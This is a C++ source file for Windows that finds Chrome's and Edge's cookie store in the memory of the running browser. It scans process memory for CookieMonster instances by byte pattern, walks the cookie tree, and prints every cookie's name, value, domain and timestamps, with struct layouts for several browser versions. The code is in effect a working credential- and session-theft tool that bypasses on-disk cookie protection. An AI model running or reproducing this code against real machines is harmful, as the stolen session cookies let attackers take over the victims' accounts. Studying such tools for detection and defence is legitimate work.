#include <Windows.h>
#include <string>
#include <map>
#include <memory>
#include <vector>

#include "Helper.h"
#include "Memory.h"

struct OptimizedString {
    char buf[23];
    UCHAR len;
};

struct RemoteString {
    uintptr_t dataAddress;
    size_t strLen; //This won't include the null terminator
    int strMax; //Maximum string length
    char unk[3]; //I just couldn't figure out the last data type :(
    UCHAR strAlloc; //Seems to always be 0x80, honestly no idea what it should mean
};

struct RemoteVector {
    uintptr_t begin_;
    uintptr_t end_;
    uintptr_t unk; //Seems to be same as the end_ ?
};

struct ProcessBoundString {
    RemoteVector maybe_encrypted_data_;
    size_t original_size_;
    BYTE unk[8]; //No clue
    bool encrypted_ = false;
};

#pragma region Chrome
enum class CookieSameSite {
    UNSPECIFIED = -1,
    NO_RESTRICTION = 0,
    LAX_MODE = 1,
    STRICT_MODE = 2,
    // Reserved 3 (was EXTENDED_MODE), next number is 4.

    // Keep last, used for histograms.
    kMaxValue = STRICT_MODE
};

enum class CookieSourceScheme {
    kUnset = 0,
    kNonSecure = 1,
    kSecure = 2,

    kMaxValue = kSecure  // Keep as the last value.
};

enum CookiePriority {
    COOKIE_PRIORITY_LOW = 0,
    COOKIE_PRIORITY_MEDIUM = 1,
    COOKIE_PRIORITY_HIGH = 2,
    COOKIE_PRIORITY_DEFAULT = COOKIE_PRIORITY_MEDIUM
};

enum class CookieSourceType {
    // 'unknown' is used for tests or cookies set before this field was added.
    kUnknown = 0,
    // 'http' is used for cookies set via HTTP Response Headers.
    kHTTP = 1,
    // 'script' is used for cookies set via document.cookie.
    kScript = 2,
    // 'other' is used for cookies set via browser login, iOS, WebView APIs,
    // Extension APIs, or DevTools.
    kOther = 3,

    kMaxValue = kOther,  // Keep as the last value.
};

//There is now additional cookie type "CookieBase", but I'm not going to add that here yet
struct CanonicalCookieChrome {
    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
    OptimizedString name;
    OptimizedString domain;
    OptimizedString path;
    int64_t creation_date;
    bool secure;
    bool httponly;
    CookieSameSite same_site;
    char partition_key[128];  //Not implemented //This really should be 128 like in Edge... but for some reason it is not?
    CookieSourceScheme source_scheme;
    int source_port;    //Not implemented //End of Net::CookieBase
    ProcessBoundString value; //size 48
    int64_t expiry_date;
    int64_t last_access_date;
    int64_t last_update_date;
    CookiePriority priority;       //Not implemented
    CookieSourceType source_type;    //Not implemented
};

#pragma endregion

#pragma region Edge
struct CanonicalCookieEdge {
    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
    OptimizedString name;
    OptimizedString domain;
    OptimizedString path;
    int64_t creation_date;
    bool secure;
    bool httponly;
    CookieSameSite same_site;
    char partition_key[136];  //Not implemented
    CookieSourceScheme source_scheme;
    int source_port;    //Not implemented //End of Net::CookieBase
    ProcessBoundString value;
    int64_t expiry_date;
    int64_t last_access_date;
    int64_t last_update_date;
    CookiePriority priority;       //Not implemented
    CookieSourceType source_type;    //Not implemented
};
#pragma endregion

#pragma region OldVersions
struct CanonicalCookieOld {
    OptimizedString name;
    OptimizedString value;
    OptimizedString domain;
    OptimizedString path;
    int64_t creation_date;
    int64_t expiry_date;
    int64_t last_access_date;
    int64_t last_update_date;
};

struct CanonicalCookie124 {
    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
    OptimizedString name;
    OptimizedString domain;
    OptimizedString path;
    int64_t creation_date;
    bool secure;
    bool httponly;
    CookieSameSite same_site;
    BYTE partition_key[120];  //Not implemented //This really should be 128 like in Edge... but for some reason it is not?
    CookieSourceScheme source_scheme;
    int source_port;    //Not implemented //End of Net::CookieBase
    OptimizedString value;
    int64_t expiry_date;
    int64_t last_access_date;
    int64_t last_update_date;
    CookiePriority priority;       //Not implemented
    CookieSourceType source_type;    //Not implemented
};

struct CanonicalCookieChrome130 {
    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
    OptimizedString name;
    OptimizedString domain;
    OptimizedString path;
    int64_t creation_date;
    bool secure;
    bool httponly;
    CookieSameSite same_site;
    char partition_key[128];  //Not implemented //This really should be 128 like in Edge... but for some reason it is not?
    CookieSourceScheme source_scheme;
    int source_port;    //Not implemented //End of Net::CookieBase
    OptimizedString value;
    int64_t expiry_date;
    int64_t last_access_date;
    int64_t last_update_date;
    CookiePriority priority;       //Not implemented
    CookieSourceType source_type;    //Not implemented
};

struct CanonicalCookieEdge130 {
    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
    OptimizedString name;
    OptimizedString domain;
    OptimizedString path;
    int64_t creation_date;
    bool secure;
    bool httponly;
    CookieSameSite same_site;
    char partition_key[136];  //Not implemented
    CookieSourceScheme source_scheme;
    int source_port;    //Not implemented //End of Net::CookieBase
    OptimizedString value;
    int64_t expiry_date;
    int64_t last_access_date;
    int64_t last_update_date;
    CookiePriority priority;       //Not implemented
    CookieSourceType source_type;    //Not implemented
};
#pragma endregion


struct Node {
    uintptr_t left;
    uintptr_t right;
    uintptr_t parent;
    bool is_black; //My guess is that data is stored in red-black tree
    char padding[7];
    OptimizedString key;
    uintptr_t valueAddress;
};

struct RootNode {
    uintptr_t beginNode;
    uintptr_t firstNode;
    size_t size;
};

void ReadVector(HANDLE hProcess, RemoteVector vector, DWORD origSize) {
    size_t szSize = vector.end_ - vector.begin_;
    if (szSize <= 0) {
        //Some cookies just are like that. tapad.com cookie: TapAd_3WAY_SYNCS for example is buggy even with browser tools
       // printf("[-] Invalid value length\n"); 
        return;
    }

    BYTE* buf = (BYTE*)malloc(szSize + 1); //+1 for the string termination
    if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(vector.begin_), buf, szSize, nullptr)) {
        // DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to read encrypted cookie value"));
        free(buf);
        return;
    }

    memcpy_s(buf + szSize, 1, "\0", 1);
    PRINT("%s\n", buf);

    free(buf);
}

//Since Chrome uses std::string type a lot, we need to take into account if the string has been optimized to use Small String Optimization
//Or if it is stored in another address
void ReadString(HANDLE hProcess, OptimizedString string) {
    if (string.len > 23)
    {
        RemoteString longString = { 0 };
        std::memcpy(&longString, &string.buf, sizeof(RemoteString));

        if (longString.dataAddress != 0) {
            unsigned char* buf = (unsigned char*)malloc(longString.strMax);
            if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, longString.strLen + 1, nullptr)) {
                // DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to read cookie value"));
                free(buf);
                return;
            }
            PRINT("%s\n", buf);
            free(buf);
        }
    }
    else
        PRINT("%s\n", string.buf);

}

void PrintTimeStamp(int64_t timeStamp) {
    ULONGLONG fileTimeTicks = timeStamp * 10;

    FILETIME fileTime;
    fileTime.dwLowDateTime = static_cast<DWORD>(fileTimeTicks & 0xFFFFFFFF);
    fileTime.dwHighDateTime = static_cast<DWORD>(fileTimeTicks >> 32);

    SYSTEMTIME systemTime;
    FileTimeToSystemTime(&fileTime, &systemTime);

    PRINT("%04hu-%02hu-%02hu %02hu:%02hu:%02hu\n",
        systemTime.wYear, systemTime.wMonth, systemTime.wDay,
        systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
}

void PrintValuesEdge(CanonicalCookieEdge130 cookie, HANDLE hProcess) {
    PRINT("    Name: ");
    ReadString(hProcess, cookie.name);
    PRINT("    Value: ");
    ReadString(hProcess, cookie.value);
    PRINT("    Domain: ");
    ReadString(hProcess, cookie.domain);
    PRINT("    Path: ");
    ReadString(hProcess, cookie.path);
    PRINT("    Creation time: ");
    PrintTimeStamp(cookie.creation_date);
    PRINT("    Expiration time: ");
    PrintTimeStamp(cookie.expiry_date);
    PRINT("    Last accessed: ");
    PrintTimeStamp(cookie.last_access_date);
    PRINT("    Last updated: ");
    PrintTimeStamp(cookie.last_update_date);
    PRINT("    Secure: %s\n", cookie.secure ? "True" : "False");
    PRINT("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");

    PRINT("\n");
}

void PrintValuesEdge(CanonicalCookieEdge cookie, HANDLE hProcess) {
    PRINT("    Name: ");
    ReadString(hProcess, cookie.name);
    PRINT("    Value: ");
    ReadVector(hProcess, cookie.value.maybe_encrypted_data_, cookie.value.original_size_);
    PRINT("    Domain: ");
    ReadString(hProcess, cookie.domain);
    PRINT("    Path: ");
    ReadString(hProcess, cookie.path);
    PRINT("    Creation time: ");
    PrintTimeStamp(cookie.creation_date);
    PRINT("    Expiration time: ");
    PrintTimeStamp(cookie.expiry_date);
    PRINT("    Last accessed: ");
    PrintTimeStamp(cookie.last_access_date);
    PRINT("    Last updated: ");
    PrintTimeStamp(cookie.last_update_date);
    PRINT("    Secure: %s\n", cookie.secure ? "True" : "False");
    PRINT("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");

    PRINT("\n");
}

void PrintValuesChrome(CanonicalCookieChrome cookie, HANDLE hProcess) {
    PRINT("    Name: ");
    ReadString(hProcess, cookie.name);
    PRINT("    Value: ");
    ReadVector(hProcess, cookie.value.maybe_encrypted_data_, cookie.value.original_size_);
    PRINT("    Domain: ");
    ReadString(hProcess, cookie.domain);
    PRINT("    Path: ");
    ReadString(hProcess, cookie.path);
    PRINT("    Creation time: ");
    PrintTimeStamp(cookie.creation_date);
    PRINT("    Expiration time: ");
    PrintTimeStamp(cookie.expiry_date);
    PRINT("    Last accessed: ");
    PrintTimeStamp(cookie.last_access_date);
    PRINT("    Last updated: ");
    PrintTimeStamp(cookie.last_update_date);
    PRINT("    Secure: %s\n", cookie.secure ? "True" : "False");
    PRINT("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");

    PRINT("\n");
}

void PrintValuesChrome(CanonicalCookieChrome130 cookie, HANDLE hProcess) {
    PRINT("    Name: ");
    ReadString(hProcess, cookie.name);
    PRINT("    Value: ");
    ReadString(hProcess, cookie.value);
    PRINT("    Domain: ");
    ReadString(hProcess, cookie.domain);
    PRINT("    Path: ");
    ReadString(hProcess, cookie.path);
    PRINT("    Creation time: ");
    PrintTimeStamp(cookie.creation_date);
    PRINT("    Expiration time: ");
    PrintTimeStamp(cookie.expiry_date);
    PRINT("    Last accessed: ");
    PrintTimeStamp(cookie.last_access_date);
    PRINT("    Last updated: ");
    PrintTimeStamp(cookie.last_update_date);
    PRINT("    Secure: %s\n", cookie.secure ? "True" : "False");
    PRINT("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");

    PRINT("\n");
}

void PrintValuesChrome(CanonicalCookie124 cookie, HANDLE hProcess) {
    PRINT("    Name: ");
    ReadString(hProcess, cookie.name);
    PRINT("    Value: ");
    ReadString(hProcess, cookie.value);
    PRINT("    Domain: ");
    ReadString(hProcess, cookie.domain);
    PRINT("    Path: ");
    ReadString(hProcess, cookie.path);
    PRINT("    Creation time: ");
    PrintTimeStamp(cookie.creation_date);
    PRINT("    Expiration time: ");
    PrintTimeStamp(cookie.expiry_date);
    PRINT("    Last accessed: ");
    PrintTimeStamp(cookie.last_access_date);
    PRINT("    Last updated: ");
    PrintTimeStamp(cookie.last_update_date);
    PRINT("    Secure: %s\n", cookie.secure ? "True" : "False");
    PRINT("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");

    PRINT("\n");
}

void PrintValuesOld(CanonicalCookieOld cookie, HANDLE hProcess) {
    PRINT("    Name: ");
    ReadString(hProcess, cookie.name);
    PRINT("    Value: ");
    ReadString(hProcess, cookie.value);
    PRINT("    Domain: ");
    ReadString(hProcess, cookie.domain);
    PRINT("    Path: ");
    ReadString(hProcess, cookie.path);
    PRINT("    Creation time: ");
    PrintTimeStamp(cookie.creation_date);
    PRINT("    Expiration time: ");
    PrintTimeStamp(cookie.expiry_date);
    PRINT("    Last accessed: ");
    PrintTimeStamp(cookie.last_access_date);
    PRINT("    Last updated: ");
    PrintTimeStamp(cookie.last_update_date);

    PRINT("\n");
}

void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, TargetVersion targetConfig) {

    if (targetConfig == Chrome) {
        CanonicalCookieChrome cookie = { 0 };
        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieChrome), nullptr)) {
            //   PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
            return;
        }
        PrintValuesChrome(cookie, hProcess);

    }
    else if (targetConfig == Edge) {
        CanonicalCookieEdge cookie = { 0 };
        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieEdge), nullptr)) {
            //  PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
            return;
        }
        PrintValuesEdge(cookie, hProcess);
    }
    else if (targetConfig == Edge130) {
        CanonicalCookieEdge130 cookie = { 0 };
        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieEdge130), nullptr)) {
            //  PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
            return;
        }
        PrintValuesEdge(cookie, hProcess);
    }
    else if (targetConfig == OldChrome) {
        CanonicalCookieOld cookie = { 0 };
        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieOld), nullptr)) {
            //  PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
            return;
        }
        PrintValuesOld(cookie, hProcess);
    }
    else if (targetConfig == Chrome124) {
        CanonicalCookie124 cookie = { 0 };
        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookie124), nullptr)) {
            //  PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
            return;
        }
        PrintValuesChrome(cookie, hProcess);
    }
    else if (targetConfig == Chrome130) {
        CanonicalCookieChrome130 cookie = { 0 };
        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieChrome130), nullptr)) {
            //  PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
            return;
        }
        PrintValuesChrome(cookie, hProcess);
    }
    else {
        // PRINT("[-] Could not read cookie values: Unknown configuration %d", targetConfig);
    }

}

void ProcessNode(HANDLE hProcess, const Node& node, TargetVersion targetConfig) {
    ReadString(hProcess, node.key);
    ProcessNodeValue(hProcess, node.valueAddress, targetConfig);

    if (node.left != 0) {
        Node leftNode;
        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(Node), nullptr))
            ProcessNode(hProcess, leftNode, targetConfig);
        //else
            //PrintErrorWithMessage(TEXT("Error reading left node"));
    }

    if (node.right != 0) {
        Node rightNode;
        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(Node), nullptr))
            ProcessNode(hProcess, rightNode, targetConfig);
        //else
            //PrintErrorWithMessage(TEXT("Error reading right node"));
    }
}

void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress, TargetVersion targetConfig) {

    RootNode cookieMap;
    if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMapAddress), &cookieMap, sizeof(RootNode), nullptr)) {
        //PrintErrorWithMessage(TEXT("Failed to read the root node from given address\n"));
        return;
    }


    //PRINT("[*] Number of available cookies: %Iu\n", cookieMap.size);

    if (cookieMap.firstNode == 0 || cookieMap.size == 0)
    {
        // PRINT("[*] This Cookie map was empty\n");
        return;
    }

    Node firstNode;
    if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr)
        ProcessNode(hProcess, firstNode, targetConfig);
    //else
        //PrintErrorWithMessage(TEXT("Error reading first node\n"));
}

BOOL MyMemCmp(BYTE* source, const BYTE* searchPattern, size_t num) {

    for (size_t i = 0; i < num; ++i) {
        if (searchPattern[i] == 0xAA)
            continue;
        if (source[i] != searchPattern[i]) {
            return FALSE;
        }
    }

    return TRUE;
}

void PatchPattern(BYTE* pattern, BYTE baseAddrPattern[], size_t offset) {
    size_t szAddr = sizeof(uintptr_t) - 1;
    for (offset -= 1; szAddr > 3; offset--) {
        pattern[offset] = baseAddrPattern[szAddr];
        szAddr--;
    }
}

BYTE* PatchBaseAddress(const BYTE* pattern, size_t patternSize, uintptr_t baseAddress) {

    BYTE* newPattern = (BYTE*)malloc(sizeof(BYTE) * patternSize);
    for (size_t i = 0; i < patternSize; i++)
        newPattern[i] = pattern[i];

    BYTE baseAddrPattern[sizeof(uintptr_t)];
    ConvertToByteArray(baseAddress, baseAddrPattern, sizeof(uintptr_t));

    PatchPattern(newPattern, baseAddrPattern, 16);
    PatchPattern(newPattern, baseAddrPattern, 24);
    PatchPattern(newPattern, baseAddrPattern, 56);
    PatchPattern(newPattern, baseAddrPattern, 80);
    PatchPattern(newPattern, baseAddrPattern, 136);
    PatchPattern(newPattern, baseAddrPattern, 168);
    PatchPattern(newPattern, baseAddrPattern, 176);
    PatchPattern(newPattern, baseAddrPattern, 184);

    return newPattern;
}

BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t* cookieMonsterInstances, size_t& szCookieMonster) {

    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);

    uintptr_t startAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMinimumApplicationAddress);
    uintptr_t endAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMaximumApplicationAddress);

    MEMORY_BASIC_INFORMATION memoryInfo;

    while (startAddress < endAddress) {
        if (VirtualQueryEx(hProcess, reinterpret_cast<LPCVOID>(startAddress), &memoryInfo, sizeof(memoryInfo)) == sizeof(memoryInfo)) {
            if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & PAGE_READWRITE) != 0 && memoryInfo.Type == MEM_PRIVATE) {
                BYTE* buffer = new BYTE[memoryInfo.RegionSize];
                SIZE_T bytesRead;

                BYTE* newPattern = PatchBaseAddress(pattern, patternSize, reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress));

                //Error code 299
                //Only part of a ReadProcessMemory or WriteProcessMemory request was completed. 
                //We are fine with that -- We were not fine with that
                //if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead) || GetLastError() == 299) {
                if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead)) {
                    for (size_t i = 0; i <= bytesRead - patternSize; ++i) {
                        if (MyMemCmp(buffer + i, newPattern, patternSize)) {
                            uintptr_t resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress) + i;
                            uintptr_t offset = resultAddress - reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
                            if (szCookieMonster >= 1000) {
                                free(newPattern);
                                return TRUE;
                            }

                            cookieMonsterInstances[szCookieMonster] = resultAddress;
                            szCookieMonster++;
                        }
                    }
                }
                else {
                    //This happens quite a lot, will not print these errors on release build
                    //DEBUG_PRINT_ERROR_MESSAGE(TEXT("ReadProcessMemory failed\n"));
                }
                free(newPattern);
                delete[] buffer;
            }

            startAddress += memoryInfo.RegionSize;
        }
        else {
            break;  // VirtualQueryEx failed
        }
    }
    if (szCookieMonster > 0)
        return TRUE;
    return FALSE;
}

BOOL FindLargestSection(HANDLE hProcess, uintptr_t moduleAddr, uintptr_t& resultAddress) {

    MEMORY_BASIC_INFORMATION memoryInfo;
    uintptr_t offset = moduleAddr;

    SIZE_T largestRegion = 0;

    while (VirtualQueryEx(hProcess, reinterpret_cast<LPVOID>(offset), &memoryInfo, sizeof(memoryInfo)))
    {
        if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & PAGE_READONLY) != 0 && memoryInfo.Type == MEM_IMAGE)
        {
            if (memoryInfo.RegionSize > largestRegion) {
                largestRegion = memoryInfo.RegionSize;
                resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
            }
        }
        offset += memoryInfo.RegionSize;
    }
    if (largestRegion > 0)
        return TRUE;

    return FALSE;
}